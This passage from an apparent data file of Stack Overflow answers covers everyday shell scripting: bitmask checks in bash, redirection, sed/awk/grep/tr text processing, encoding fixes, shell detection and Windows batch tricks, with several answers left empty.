| ==> 1 |     7 |     6 |     6 |\n|---------|-----------------------------------------------|\n|check:   |  3 & 5 == 1 ? YES     |                       |\n|         |  3 & 5 >= 1 ? YES     | ==>  3 & 5 > 0 ? YES  |\n|=========================================================|\n\n|------------------ value: 4 / mask: 5 -------------------|\n|         | value | mask  |  and  |  or   |  xor  | xnor  |\n|         |   4   |   5   | 4 & 5 | 4 | 5 | 4 ^ 5 |       |\n| bit val |bit:val|bit:val|bit:val|bit:val|bit:val|bit:val|\n|---------|-------|-------|-------|-------|-------|-------|\n|  0   1  | 0   0 | 1   1 | 0   0 | 1   1 | 1   1 | 1   1 |\n|  1   2  | 0   0 | 0   0 | 0   0 | 0   0 | 0   0 | 0   0 |\n|  2   4  | 4   1 | 4   1 | 1   4 | 1   4 | 0   0 | 0   0 |\n|  3   8  | 0   0 | 0   0 | 0   0 | 0   0 | 0   0 | 0   0 |\n|---------|-------|-------|-------|-------|-------|-------|\n|sum:     |     4 |     5 | ==> 4 |     5 |     1 |     1 |\n|---------|-----------------------------------------------|\n|check:   |  4 & 5 == 1 ? NO      |                       |\n|         |  4 & 5 >= 1 ? YES     | ==>  4 & 5 > 0 ? YES  |\n|=========================================================|\n\nPlease pay particular attention to the following checks:\n|---------|-----------------------------------------------|\n|check:   |  3 & 5 == 1 ? YES     |                       |\n|         |  3 & 5 >= 1 ? YES     | ==>  3 & 5 > 0 ? YES  |\n---------|------------------------------------------------|\n|check:   |  4 & 5 == 1 ? NO      |                       |\n|         |  4 & 5 >= 1 ? YES     | ==>  4 & 5 > 0 ? YES  |\n|---------|-----------------------------------------------|\n\nThe output above is created by the following snippet:\n( # start a sub-shell to encapsulate vars for easy copy-paste into the terminal\n  # do not use this in a script!\necho ;\nfor o in 3 4; do\necho \"|------------------ value: $o / mask: 5 -------------------|\";\necho \"|         | value | mask  |  and  |  or   |  xor  | xnor  |\";\necho \"|         |   $o   |   5   | $o & 5 | $o | 5 | $o ^ 5 |       |\";\necho \"| bit val |bit:val|bit:val|bit:val|bit:val|bit:val|bit:val|\";\necho \"|---------|-------|-------|-------|-------|-------|-------|\";\nmask=0;\nfor (( bit=0; bit<4; bit++)); do\n    mask=$((1<<bit));\n    echo -n \"|  $bit   $mask \"\n    echo -n \" | $(($o&mask))   $((($o&mask)>0))\"\n    echo -n \" | $((5&mask))   $(((5&mask)>0))\"\n    echo -n \" | $(((($o&mask)&(5&mask))>0))   $((($o&mask)&(5&mask)))\"\n    echo -n \" | $(((($o&mask)|(5&mask))>0))   $((($o&mask)|(5&mask)))\"\n    echo -n \" | $(((($o&mask)^(5&mask))>0))   $((($o&mask)^(5&mask)))\"\n    echo -n \" | $(((($o&mask)^(5&mask))>0))   $((($o&mask)^(5&mask)))\"\n    echo \" |\";\ndone ;\necho \"|---------|-------|-------|-------|-------|-------|-------|\";\necho -n \"|sum:     |     $o |     5 |\";\necho \" ==> $(($o&5)) |     $(($o|5)) |     $(($o^5)) |     $(($o^5)) |\";\necho \"|---------|-----------------------------------------------|\";\necho -n \"|check:   |  $o & 5 == 1 ? $(((($o&5)==1))&&echo YES||echo \"NO \")     \";\necho \"|                       |\";\necho -n \"|         |  $o & 5 >= 1 ? $(((($o&5)>=1))&&echo YES||echo \"NO \")     \";\necho \"| ==>  $o & 5 > 0 ? $(((($o&5)>0))&&echo YES||echo \"NO \")  |\";\necho \"|=========================================================|\";\necho ;\ndone\necho ;\n)\n\nHello World!\n... or: \"Rise and Shine!\"\nSo how do we do it now?! Let's imagine, we have the following option set:\n# option set:\noption_1=1\noption_2=2\noption_3=4\noption_4=8\noption_5=16\noption_6=32\noption_7=64\noption_8=128\noption_9=256\n\nWe could for example set a selection of those options in a function and return the combined code as a return value. Or the other way round: pass a selection of options as one numeric parameter. Whatever your use case is, the options would be summed together:\n# set options:\noption = option_1\n       + option_4\n       + option_5\n       + option_9\n\nHow do we best check, which options are set (1,4,5, & 9)? It depends of course again on your use case, but i kinda like the case construct! Something like ...\ncase $option in\n  0) echo \"no option set!\";;\n  1) echo \"option 1\";;\n  2) echo \"option 2\";;\n  3) echo \"option 1 and 2\";;\n  *) echo \"...\";;\nesac\ncould work, but is not very nice, as we would have to construct every combination!\n\nAnd the winner is ...\n... or: \"The Real Case\"\nWe can use case in the following way instead ...\necho \"check for options using >0:\"\ncase 1 in\n  $(( (option & option_1) >0 )) ) echo \"- option_1 is set\";;&\n  $(( (option & option_2) >0 )) ) echo \"- option_2 is set\";;&\n  $(( (option & option_3) >0 )) ) echo \"- option_3 is set\";;&\n  $(( (option & option_4) >0 )) ) echo \"- option_4 is set\";;&\n  $(( (option & option_5) >0 )) ) echo \"- option_5 is set\";;&\n  $(( (option & option_6) >0 )) ) echo \"- option_6 is set\";;&\n  $(( (option & option_7) >0 )) ) echo \"- option_7 is set\";;&\n  $(( (option & option_8) >0 )) ) echo \"- option_8 is set\";;&\n  $(( (option & option_9) >0 )) ) echo \"- option_9 is set\";;&\nesac\nPlease note that\nthe spaces within $(( (option & option_1) >0 )) ) are completely optional and are added for readability. The last closing bracket ) is for the case construct.\nthe command-lists are terminated with ;;&, in order to continue evaluation with the next option test. In case you want to abord further processing of the list, set option=0 or to your current option=option_X.\n... we get the following result:\ncheck for options using >0:\n- option_1 is set\n- option_4 is set\n- option_5 is set\n- option_9 is set\nHurray! :-)\n\nAnd if I was a rich man!\necho \"# to use it in an if statement:\";\nif (((option&option_5)>0)); then\n  echo \"- option_5 is set\"    \nelse\n  echo \"- option_5 is NOT set\"\nfi\n\n# to use it in an if statement:\n- option_5 is set\n\nBut finally the poor man's condition:\necho \"# or to use it just for conditional execution:\";\n(((option&option_6)>0)) \\\n&& echo \"- option_6 is set\" \\\n|| echo \"- option_6 is NOT set\"\n\n# or to use it just for conditional execution:\n- option_6 is NOT set\n\n\"He who does not answer the questions has passed the test.\"\n... or: 'Stay,' he said, 'that was only a test.'\n(Kafka, 1975: 181)\nSo it would be perfectly possible to use the solution as posted in the question, by the slight change as follows:\n(\ndeclare -A releases=([token]=4)\ndeclare -i MASK=5\n\nif [[ $(( releases[\"token\"] & $MASK )) -gt 0 ]]; then\n  echo YES\nelse\n  echo NO\nfi\n)\nThe changes are the following: - use $(()) instead of () to do the test, which will return the value of the bitwise comparison - use -gt 0 instead of -eq 1\n\naltogether in action:\n( # start a sub-shell to encapsulate vars for easy copy-paste into the terminal\n  # do not use this in a script!\necho ;\n\nfor ((i=0; i<9;i++)); do\n    o=\"option_$((i+1))\"\n    declare -i $o=$((1<<$i))\n    echo \"$o = ${!o}\"\ndone\n\necho ;\necho ;\n\necho \"# set options:\"\necho \"option = option_1\"\necho \"       + option_4\"\necho \"       + option_5\"\necho \"       + option_9\"\n\noption=option_1+option_4+option_5+option_9\n\necho ;\necho ;\n\necho \"check for options using >0:\"\ncase 1 in\n  $(( (option & option_1) >0 )) ) echo \"- option_1 is set\";;&\n  $(( (option & option_2) >0 )) ) echo \"- option_2 is set\";;&\n  $(( (option & option_3) >0 )) ) echo \"- option_3 is set\";;&\n  $(( (option & option_4) >0 )) ) echo \"- option_4 is set\";;&\n  $(( (option & option_5) >0 )) ) echo \"- option_5 is set\";;&\n  $(( (option & option_6) >0 )) ) echo \"- option_6 is set\";;&\n  $(( (option & option_7) >0 )) ) echo \"- option_7 is set\";;&\n  $(( (option & option_8) >0 )) ) echo \"- option_8 is set\";;&\n  $(( (option & option_9) >0 )) ) echo \"- option_9 is set\";;&\nesac\n\necho ;\necho ;\n\necho \"# to use it in an if statement:\";\necho \"  => if (((option&option_5)>0));\";\nif (((option&option_5)>0)); then\n    echo \"- option_5 is set\"    \nelse\n    echo \"- option_5 is NOT set\"\nfi\n\necho ;\necho ;\n\ndeclare -A releases=([token]=4)\ndeclare -i MASK=5\n\necho \"# Does 4 pass the mask 5 in the test construct?\";\necho \"  => if [[ $(( releases[\"token\"] & $MASK )) -gt 0 ]];\";\nif [[ $(( releases[\"token\"] & $MASK )) -gt 0 ]]; then\n    echo YES\nelse\n    echo NO\nfi\n\necho ;\necho ;\n\necho \"# or to use it just for conditional execution:\";\necho \"  => (((option&option_6)>0)) && do || dont\";\n(((option&option_6)>0)) \\\n&& echo \"- option_6 is set\" \\\n|| echo \"- option_6 is NOT set\"\n\n)\n\nThe End\nExit 0",
    "How to close file descriptor via Linux shell command": "You can definitely close fd's of other running processes as long as you have the permissions to do so.\nFirst, find the PID.\nThen, start gdb and attach to the process:\ngdb -p 1598\nThen, call the close system call on the fd you want to close:\n(gdb) call close(999)\n$1 = 0\nIf the file descriptor was a leaked one, then the program will never try to use it again anyway, and it shouldn't cause any issues. The program most likely has a bug, however.",
    "How do I resolve ffmpeg concat command error \"unknown keyword...\"?": "This is a bit late for the original post, but I was just searching for answers to the same problem so I think it's still relevant and I haven't found any more recent posts answering the same problem.\nI found that my .txt file was encoded wrong. I opened the file in Notepad and did a 'Save As...' I changed the encoding to UTF-8 and the ffmpeg concat command worked.",
    "Build failure while running shell command from Jenkins": "",
    "HOWTO: Detect bash from shell script": "There are a bunch of environment variables that you can look at but many of them will not detect if a different shell is spawned from bash. Consider the following:\nbash$ echo \"SHELL: $SHELL, shell: $shell, ARGV[0]: $0, PS1: $PS1, prompt: $prompt\"\nSHELL: /bin/bash, shell: , ARGV[0]: -bash, PS1: bash$ , prompt: \n\nbash$ csh\n[lorien:~] daveshawley% echo \"SHELL: $SHELL, shell: $shell, \\$0: $0, PS1: $PS1, prompt: $prompt\"\nSHELL: /bin/bash, shell: /bin/tcsh, ARGV[0]: csh, PS1: bash$ , prompt: [%m:%c3] %n%#\n\n[lorien:~] daveshawley% bash -r\nbash$ echo \"SHELL: $SHELL, shell: $shell, ARGV[0]: $0, PS1: $PS1, prompt: $prompt\"\nSHELL: /bin/bash, shell: , ARGV[0]: sh, PS1: bash$ , prompt:\n\nbash$ zsh\n% echo \"SHELL: $SHELL, shell: $shell, ARGV[0]: $0, PS1: $PS1, prompt: $prompt\"\nSHELL: /bin/bash, shell: , ARGV[0]: zsh, PS1: % , prompt: % \n\n% ksh\n$ echo \"SHELL: $SHELL, shell: $shell, ARGV[0]: $0, PS1: $PS1, prompt: $prompt\"\nSHELL: /bin/bash, shell: , ARGV[0]: ksh, PS1: bash$ , prompt: \nThere are a number of variables specific to the various shells except that they have a habit of being inherited by sub-shells which is where the environment thing really breaks. The only thing that almost works is ps -o command -p $$. This technically gives you the command name that the shell is running as. In most cases this will work... since applications are started with some variant of the exec system call and it allows for the name of the command and the executable to differ, it is possible for this to fail as well. Consider:\nbash$ exec -a \"-csh\" bash\nbash$ echo \"$0, $SHELL, $BASH\"\n-csh, /bin/bash, /bin/bash\nbash$ ps -o command -p $$\nCOMMAND\n-csh\nbash$\nAnother trick is to use lsof -p $$ | awk '(NR==2) {print $1}'. This is probably as close as you can get if you are lucky enough to have lsof handy.",
    "Git Status Across Multiple Repositories on a Mac": "It seems that the question has been answered fine, but I wanted to throw in my two cents after working on the same thing.\nI went closer to jcordasc's answer by using a simple bash script. I just did one thing a little different. Looking at the help docs for git you can set the git directory and working directory. This eliminates the need to 'cd' to the directories. Not that it really makes that much difference...\n#!/bin/bash\n\nfor gitdir in `find ./ -name .git`; \n    do \n        workdir=${gitdir%/*}; \n        echo; \n        echo $workdir; \n        git --git-dir=$gitdir --work-tree=$workdir status; \n    done\nObviously his is more advanced/cleaner for how it shows the status'...",
    "How to get the count of fields in a delimited string?": "You can say:\n$ echo \"field1;field2;field3;field4;\" | grep -o \";\" | wc -l\n4\nAlternatively,\n$ tr -dc ';' <<< \"field1;field2;field3;field4;\" | wc -c\n4\nEDIT: In order to loop over the fields, you can say:\n$ IFS=';' read -ra field <<< \"field1;field2;field3;field4;\"\n$ for i in \"${field[@]}\"; do echo $i; done\nfield1\nfield2\nfield3\nfield4",
    "How do I find where Python is located on Unix?": "Try:\nwhich python\nin a terminal.",
    "How can I redirect console output to file?": "Use shell output redirection\nyour-command > outputfile.txt\nThe standard error will still be output to the console. If you don't want that, use:\nyour-command > outputfile.txt 2>&1\nor\nyour-command &> outputfile.txt\nYou should also look into the tee utility, which can make it redirect to two places at once.",
    "Using date to get tomorrows date in Bash": "If you have gnu-date then to get next day you can just do:\ndate -d '+1 day'",
    "What options are available for Shell32.Folder.GetDetailsOf(..,..)?": "I figured this out by accident. If you pass null into GetDetailsOf then it responds with the column names. For example, execute the following JScript with cscript:\nvar shellapp = WScript.CreateObject(\"Shell.Application\");\nvar folder = shellapp.NameSpace(\"D:\\\\\");\nfor (var j = 0; j < 0xFFFF; j++) {\n    detail = folder.GetDetailsOf(null, j);\n    if (!detail) {\n        break;\n    }\n    WScript.Echo(\"[\" + j + \"] = \" + detail);\n}\nOn my Windows 10 system this outputs:\n[0] = Name\n[1] = Size\n[2] = Item type\n[3] = Date modified\n[4] = Date created\n[5] = Date accessed\n[6] = Attributes\n[7] = Offline status\n[8] = Availability\n[9] = Perceived type\n[10] = Owner\n[11] = Kind\n[12] = Date taken\n[13] = Contributing artists\n[14] = Album\n[15] = Year\n[16] = Genre\n[17] = Conductors\n[18] = Tags\n[19] = Rating\n[20] = Authors\n[21] = Title\n[22] = Subject\n[23] = Categories\n[24] = Comments\n[25] = Copyright\n[26] = #\n[27] = Length\n[28] = Bit rate\n[29] = Protected\n[30] = Camera model\n[31] = Dimensions\n[32] = Camera maker\n[33] = Company\n[34] = File description\n[35] = Program name\n[36] = Duration\n[37] = Is online\n[38] = Is recurring\n[39] = Location\n[40] = Optional attendee addresses\n[41] = Optional attendees\n[42] = Organizer address\n[43] = Organizer name\n[44] = Reminder time\n[45] = Required attendee addresses\n[46] = Required attendees\n[47] = Resources\n[48] = Meeting status\n[49] = Free/busy status\n[50] = Total size\n[51] = Account name\nAnd this is quite different from Windows 2000 as detailed from Retrieving Extended File Properties. Incidentally if you pass in a different NameSpace then you're going to get different attributes. In my example, I'm asking what attributes are available for files on drive D: which could be different depending on its format.",
    "How to uninstall own app from /system/app?": "",
    "How to extract data from html table in shell script?": "Go with (g)awk, it's capable :-), here is a solution, but please note: it's only working with the exact html table format you had posted.\n awk -F \"</*td>|</*tr>\" '/<\\/*t[rd]>.*[A-Z][A-Z]/ {print $3, $5, $7 }' FILE\nHere you can see it in action: https://ideone.com/zGfLe\nSome explanation:\n-F sets the input field separator to a regexp (any of tr's or td's opening or closing tag\nthen works only on lines that matches those tags AND at least two upercasse fields\nthen prints the needed fields.\nHTH",
    "awk adding color code to text": "\\033[?m properly quoted gives colour:\nawk 'BEGIN{ print \"\\033[34msomething in colour\\033[0m\";}'\nnotice how one needs to unescape $1 below:\necho something | awk '{ print \"\\033[34m\"$1\" in colour \\033[0m\";}'",
    "syntax error near unexpected token ' - bash": "It could be a file encoding issue.\nI have encountered file type encoding issues when working on files between different operating systems and editors - in my case particularly between Linux and Windows systems.\nI suggest checking your file's encoding to make sure it is suitable for the target linux environment. I guess an encoding issue is less likely given you are using a MAC than if you had used a Windows text editor, however I think file encoding is still worth considering.\n--- EDIT (Add an actual solution as recommended by @Potatoswatter)\n\nTo demonstrate how file type encoding could be this issue, I copy/pasted your example script into Notepad in Windows (I don't have access to a Mac), then copied it to a linux machine and ran it:\njdt@cookielin01:~/windows> sh ./originalfile             \n./originalfile: line 2: syntax error near unexpected token `$'{\\r''\n'/originalfile: line 2: `test() {\nIn this case, Notepad saved the file with carriage returns and linefeeds, causing the error shown above. The \\r indicates a carriage return (Linux systems terminate lines with linefeeds \\n only).\nOn the linux machine, you could test this theory by running the following to strip carriage returns from the file, if they are present:\ncat originalfile | tr -d \"\\r\" > newfile\nThen try to run the new file sh ./newfile . If this works, the issue was carriage returns as hidden characters.\nNote: This is not an exact replication of your environment (I don't have access to a Mac), however it seems likely to me that the issue is that an editor, somewhere, saved carriage returns into the file.\n--- /EDIT\nTo elaborate a little, operating systems and editors can have different file encoding defaults. Typically, applications and editors will influence the filetype encoding used, for instance, I think Microsoft Notepad and Notepad++ default to Windows-1252. There may be newline differences to consider too (In Windows environments, a carriage return and linefeed is often used to terminate lines in files, whilst in Linux and OSX, only a Linefeed is usually used).\nA similar question and answer that references file encoding is here: bad character showing up in bash script execution",
    "Script to create individual zip files for each .txt file it finds and move them after": "find . -name '*.txt.*' -print -exec zip '{}'.zip '{}' \\; -exec mv '{}'.zip '{}' \\;\nFind the .txt files\nThe first -exec zips the files\nThe second -exec renames the zipped files to the original names\nNote that this procedure overwrites the original files. To be sure that the new files are actual zip files, you can do:\nfile InstructionManager.txt.*\nWhich should return:\nInstructionManager.txt.0: Zip archive data, at least v1.0 to extract\nInstructionManager.txt.1: Zip archive data, at least v1.0 to extract",
    "Batch to detect if system is a 32-bit or 64-bit": "Check for %PROCESSOR_ARCHITECTURE% being x86:\nif %PROCESSOR_ARCHITECTURE%==x86 (\n  rem 32 bit\n) else (\n  rem 64 bit\n)\nAt least for the time being. On a server I have access to it's AMD64 but no clue how Itanium looks like, for example. But 32-bit versions always report x86.\nAnother option, that also works on WoW64:\nfor /f \"skip=1 delims=\" %%x in ('wmic cpu get addresswidth') do if not defined AddressWidth set AddressWidth=%%x\n\nif %AddressWidth%==64 (\n  rem 64 bit\n) else (\n  rem 32 bit\n)",
    "How to run an adb shell command and remain in the shell?": "",
    "Bash read output?": "So you want\noutput=$(command)\nwhile IFS= read -r line; do\n    process \"$line\"\ndone <<< \"$output\"\nSee \"Here strings\" in the Bash manual.\nor process substitution\nwhile IFS= read -r line; do\n    process \"$line\"\ndone < <(command)\nComing back to this after a few years, now I'd read the output of the command into an array:\nreadarray -t lines < <(command)\nfor line in \"${lines[@]}\"; do\n    do-something-with \"$line\"\ndone",
    "retrieve a word after a regular expression in shell script": "If extracting one value (or, generally, a non-repeating set of values captured by distinct capture groups) is enough and you're running bash, ksh, or zsh, consider using the regex-matching operator, =~: [[ string =~ regex ]]:\nTip of the hat to @Adrian Fr\u00fchwirth for the gist of the ksh and zsh solutions.\nSample input string:\nstring='project=XYZ; cell=ABC; strain=C3H; sex=F; age=PQR; treatment=None; id=MLN'\nShell-specific use of =~ is discussed next; a multi-shell implementation of the =~ functionality via a shell function can be found at the end.\nbash\nThe special BASH_REMATCH array variable receives the results of the matching operation: element 0 contains the entire match, element 1 the first capture group's (parenthesized subexpression's) match, and so on.\nbash 3.2+:\n[[ $string =~ \\ cell=([^;]+) ]] && cell=${BASH_REMATCH[1]} # -> $cell == 'ABC'\nbash 4.x:\nWhile the specific command above works, using regex literals in bash 4.x is buggy, notably when involving word-boundary assertions \\< and \\> on Linux; e.g., [[ a =~ \\<a ]] inexplicably doesn't match; workaround: use an intermediate variable (unquoted!): re='\\a'; [[ a =~ $re ]] works (also on bash 3.2+).\nbash 3.0 and 3.1 - or after setting shopt -s compat31:\nQuote the regex to make it work:\n[[ $string =~ ' cell=([^;]+)' ]] && cell=${BASH_REMATCH[1]}  # -> $cell == 'ABC'\nksh\nThe ksh syntax is the same as in bash, except:\nthe name of the special array variable that contains the matched strings is .sh.match (you must enclose the name in {...} even when just implicitly referring to the first element with ${.sh.match}):\n[[ $string =~ \\ cell=([^;]+) ]] && cell=${.sh.match[1]} # -> $cell == 'ABC'\nzsh\nThe zsh syntax is also similar to bash, except:\nThe regex literal must be quoted - for simplicity as a whole, or at least some shell metacharacters, such as ;.\nyou may, but needn't double-quote a regex provided as a variable value.\nNote how this quoting behavior differs fundamentally from that of bash 3.2+: zsh requires quoting only for syntax reasons and always treats the resulting string as a whole as a regex, whether it or parts of it were quoted or not.\nThere are 2 variables containing the matching results:\n$MATCH contains the entire matched string\narray variable $match contains only the matches for the capture groups (note that zsh arrays start with index 1 and that you don't need to enclose the variable name in {...} to reference array elements)\n [[ $string =~ ' cell=([^;]+)' ]] && cell=$match[1] # -> $cell == 'ABC'\nMulti-shell implementation of the =~ operator as shell function reMatch\nThe following shell function abstracts away the differences between bash, ksh, zsh with respect to the =~ operator; the matches are returned in array variable ${reMatches[@]}.\nAs @Adrian Fr\u00fchwirth notes, to write portable (across zsh, ksh, bash) code with this, you need to execute setopt KSH_ARRAYS in zsh so as to make its arrays start with index 0; as a side effect, you also have to use the ${...[]} syntax when referencing arrays, as in ksh and bash).\nApplied to our example we'd get:\n  # zsh: make arrays behave like in ksh/bash: start at *0*\n[[ -n $ZSH_VERSION ]] && setopt KSH_ARRAYS\n\nreMatch \"$string\" ' cell=([^;]+)' && cell=${reMatches[1]}\nShell function:\n# SYNOPSIS\n#   reMatch string regex\n# DESCRIPTION\n#   Multi-shell implementation of the =~ regex-matching operator;\n#   works in: bash, ksh, zsh\n#\n#   Matches STRING against REGEX and returns exit code 0 if they match.\n#   Additionally, the matched string(s) is returned in array variable ${reMatch[@]},\n#   which works the same as bash's ${BASH_REMATCH[@]} variable: the overall\n#   match is stored in the 1st element of ${reMatch[@]}, with matches for\n#   capture groups (parenthesized subexpressions), if any, stored in the remaining\n#   array elements.\n#   NOTE: zsh arrays by default start with index *1*.\n# EXAMPLE:\n#   reMatch 'This AND that.' '^(.+) AND (.+)\\.' # -> ${reMatch[@]} == ('This AND that.', 'This', 'that')\nfunction reMatch {\n  typeset ec\n  unset -v reMatch # initialize output variable\n  [[ $1 =~ $2 ]] # perform the regex test\n  ec=$? # save exit code\n  if [[ $ec -eq 0 ]]; then # copy result to output variable\n    [[ -n $BASH_VERSION ]] && reMatch=( \"${BASH_REMATCH[@]}\" )\n    [[ -n $KSH_VERSION ]]  && reMatch=( \"${.sh.match[@]}\" )\n    [[ -n $ZSH_VERSION ]]  && reMatch=( \"$MATCH\" \"${match[@]}\" )\n  fi\n  return $ec\n}\nNote:\nfunction reMatch (as opposed to reMatch()) is used to declare the function, which is required for ksh to truly create local variables with typeset.",
    "How can I sort by first column textually and then by the second numerically with 'sort'?": "You have to terminate the primary key, otherwise, sort uses all the fields starting from the given one:\nsort -k1,1 -k2n",
    "How to specify the current directory in Windows Shell?": "%CD% is your current directory. Try echo %CD% in a dos prompt to try it out.",
    "Git Shell: How can we remove specific file from untracked files": "If the file isn't tracked by git, it's not git's job to remove it. Just use normal shell commands, like rm instead of git rm.\nIf you want to delete all untracked files, you could do a git clean.",
    "How to get output of a bash command in a variable": "You have to include the output of the special standard error output stream:\ncmd_output=$(rm \"$file\" 2>&1)\nThere are three default streams on every program (that are numbered file descriptors):\n0. Standard input (where the program normally reads from)\n1. Standard output (where the program normally writes to)\n2. Standard error (where the program normally writes error messages)\nSo to capture the error messages, we must redirect standard error output (stderr) into normal standard output (stdout) which will then be captured by the $(...) expression.\nThe syntax for redirection is through the > \"operator\". Immediately before it you tell which file descriptor to redirect (the default is 1, which is stdout). And you can specify it to redirect to a file. If you write an ampersand (&) after it, you force it to redirect into another file descriptor. Therefore, in this example, we redirect file descriptor 2 (stderr) into file descriptor 1 (stdout).\nAlso, you can also redirect input with < \"operator\", but in this case the default file descriptor is 0 (stdin).\nAnother observation is that it is probably good practice to place your $file variable between double quotes, in case it has white space characters.\nHope this helps a little =)",
    "How does grep work?": "The power of grep is the magic of automata theory. GREP is an abbreviation for Global Regular Expression Print. And it works by constructing an automaton (a very simple \"virtual machine\": not Turing Complete); it then \"executes\" the automaton against the input stream.\nThe automaton is a graph or network of nodes or states. The transition between states is determined by the input character under scrutiny. Special automatons like + and * work by having transitions that loop back to themselves. Character classes like [a-z] are represented by a fan: one start node with branches for each character out to the \"spokes\"; and usually the spokes have a special \"epsilon transition\" to a single final state so it can be linked up with the next automaton to be built from the regular expression (the search string). The epsilon transitions allow a change of state without moving forward in the string being searched.\nEdit: It appears I didn't read the question very closely.\nWhen you type a command-line, it is first pre-processed by the shell. The shell performs alias substitutions and filename globbing. After substituting aliases (they're like macros), the shell chops up the command-line into a list of arguments (space-delimited). This argument list is passed to the main() function of the executable command program as an integer count (often called argc) and a pointer to a NULL-terminated ((void *)0) array of nul-terminated ('\\0') char arrays.\nIndividual commands make use of their arguments however they wish. But most Unix programs will print a friendly help message if given the -h argument (since it begins with a minus-sign, it's called an option). GNU software will also accept a \"long-form\" option --help.\nSince there are a great many differences between different versions of Unix programs the most reliable way to discover the exact syntax that a program requires is to ask the program itself. If that doesn't tell you what you need (or it's too cryptic to understand), you should next check the local manpage (man grep). And for gnu software you can often get even more info from info grep.",
    "extract words from a file": "You could use grep:\n-E '\\w+' searches for words\n-o only prints the portion of the line that matches\n% cat temp\nSome examples use \"The quick brown fox jumped over the lazy dog,\"\nrather than \"Lorem ipsum dolor sit amet, consectetur adipiscing elit\"\nfor example text.\n# if you don't care whether words repeat\n% grep -o -E '\\w+' temp\nSome\nexamples\nuse\nThe\nquick\nbrown\nfox\njumped\nover\nthe\nlazy\ndog\nrather\nthan\nLorem\nipsum\ndolor\nsit\namet\nconsectetur\nadipiscing\nelit\nfor\nexample\ntext\nIf you want to only print each word once, disregarding case, you can use sort\n-u only prints each word once\n-f tells sort to ignore case when comparing words\n# if you only want each word once\n% grep -o -E '\\w+' temp | sort -u -f\nadipiscing\namet\nbrown\nconsectetur\ndog\ndolor\nelit\nexample\nexamples\nfor\nfox\nipsum\njumped\nlazy\nLorem\nover\nquick\nrather\nsit\nSome\ntext\nthan\nThe\nuse",
    "How do I replace a string with a newline using a bash script and sed?": "Using pure BASH string manipulation:\neol=$'\\n'\nline=\"${line//@@ /$eol}\"\n\necho \"$line\"\nValue1|Value2|Value3|Value4\nValue5|Value6|Value7|Value8\nValue9|etc...\nOr else do it in single step:\nline=\"${line//@@ /$'\\n'}\"",
    "How to count number of tabs in each line using shell script?": "awk '{print gsub(/\\t/,\"\")}' inputfile > output.txt",
    "Linux find and replace": "Try the following command for the file file.txt:\nsed -i 's/abc/abcd/g' file.txt\n\nTry the following command for all files in the current folder:\nfind . -maxdepth 1 -type f -exec sed -i 's/abc/abcd/g' {} \\;\nFor the files in the current directory and all subdirectories:\nfind . -type f -exec sed -i 's/abc/abcd/g' {} \\;\nOr if you are fan of xargs:\nfind . -type f  | xargs -I {}  sed -i 's/abc/abcd/g' {}",
    "Curl and wget: why isn't the GET parameter used?": "Try adding quotes:\ncurl -O 'http://www.objektvision.se/annonsorer?ai=26033&iip=100'\nwget 'http://www.objektvision.se/annonsorer?ai=26033&iip=100'\nThe & has special functionality on the command line which is likely causing the issues.",
    "Difference between test -h and test -L": "The source code for ksh93, in file bltins/test.c, shows that these two options are treated exactly the same, except for the author's hopes for the future:\n        case 'L':\n        case 'h': /* undocumented, and hopefully will disappear */\n            if(*arg==0 || arg[strlen(arg)-1]=='/' || lstat(arg,&statb)<0)\n                    return(0);\n            return(S_ISLNK(statb.st_mode));\nFrom this I conclude that they behave exactly the same, but that -h is a legacy option and may one day disappear :-)",
    "Escape quotes in jq": "Just use a variable and save yourself the hassle:\n< package.json jq --arg b \"$BOO\" '. + { foo: $b }'\n--arg b \"$BOO\" creates a variable $b that you can use inside jq, without having to deal with quoting issues.\nThat said, the reason that your attempt was failing was that you were missing some literal double quotes:\n< package.json jq '. + { foo: \"'\"$BOO\"'\" }'\nThe extra double quotes inside each of the the single-quoted parts of the command are needed, as the other ones are consumed by the shell before the command string is passed to jq.\nThis will still fail in the case that the shell variable contains any quotes, so the first approach is the preferred one.",
    "Unix script appends ^M at end of each line": "I'm not sure how echo could be producing ^M characters but you can remove them by running dos2unix on your file, like this:\ndos2unix /cust/vivek.txt",
    "Delete lines from file with SED or AWK": "Using sed:\nDelete 1st line:\nsed '1d' file-name\nDelete 10th line:\nsed '10d' file-name\nDelete line # 5 to 10\nsed '5,10d' file-name\nAll above sed commands will write output on stdout that you can redirect to another file if you want or use -i flag of sed to inline edit the file.",
    "Execute shell command from within a MySQL client?": "You can use the system command.\nsystem command, \\! command\nExecutes the given command using your default command interpreter.\nThe system command works only in Unix.\nExample:\nsystem ls -l",
    "Converting ANSI to UTF-8 in shell": "Put the output into another file. Don't overwrite the old one.\niconv -f \"windows-1252\" -t \"UTF-8\" import.csv -o new_import.csv\niconv fails when reading and writing to the same file.",
    "adb shell input text with space": "",
    "How to assign a multiple line value to a bash variable": "Don't indent the lines or you'll get extra spaces. Use quotes when you expand \"$FOO\" to ensure the newlines are preserved.\n$ FOO=\"This is line 1 \nThis is line 2   \nThis is line 3\"\n$ echo \"$FOO\"\nThis is line 1\nThis is line 2\nThis is line 3\nAnother way is to use \\n escape sequences. They're interpreted inside of $'...' strings.\n$ FOO=$'This is line 1\\nThis is line 2\\nThis is line 3'\n$ echo \"$FOO\"\nA third way is to store the characters \\ and n, and then have echo -e interpret the escape sequences. It's a subtle difference. The important part is that \\n isn't interpreted inside of regular quotes.\n$ FOO='This is line 1\\nThis is line 2\\nThis is line 3'\n$ echo -e \"$FOO\"\nThis is line 1\nThis is line 2\nThis is line 3\nYou can see the distinction I'm making if you remove the -e option and have echo print the raw string without interpreting anything.\n$ echo \"$FOO\"\nThis is line 1\\nThis is line 2\\nThis is line 3",
    "Removing all special characters from a string in Bash": "You can use tr to print only the printable characters from a string like below. Just use the below command on your input file.\ntr -cd \"[:print:]\\n\" < file1   \nThe flag -d is meant to the delete the character sets defined in the arguments on the input stream, and -c is for complementing those (invert what's provided). So without -c the command would delete all printable characters from the input stream and using it complements it by removing the non-printable characters. We also keep the newline character \\n to preserve the line endings in the input file. Removing it would just produce the final output in one big line.\nThe [:print:] is just a POSIX bracket expression which is a combination of expressions [:alnum:], [:punct:] and space. The [:alnum:] is same as [0-9A-Za-z] and [:punct:] includes characters ! \" # $ % & ' ( ) * + , - . / : ; < = > ? @ [ \\ ] ^ _ ` { | } ~",
